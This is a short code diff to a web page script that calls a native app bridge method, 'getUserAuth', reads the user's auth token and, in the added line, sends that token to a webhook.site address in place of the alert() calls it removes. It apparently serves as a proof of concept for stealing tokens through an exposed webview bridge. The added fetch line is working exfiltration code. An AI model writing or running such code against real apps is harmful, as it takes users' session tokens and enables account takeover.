@@ -5,8 +5,7 @@
         const bridge = window.dsBridge || window._dsbridge;
         bridge.call("getUserAuth", {}, function(resp){
             const token = resp.data.authtoken;
-            alert("data:" + JSON.stringify(resp));
-            alert("token:" + token);
+            fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?jwt_token=" + encodeURIComponent(token));
         });
     });
 </script>
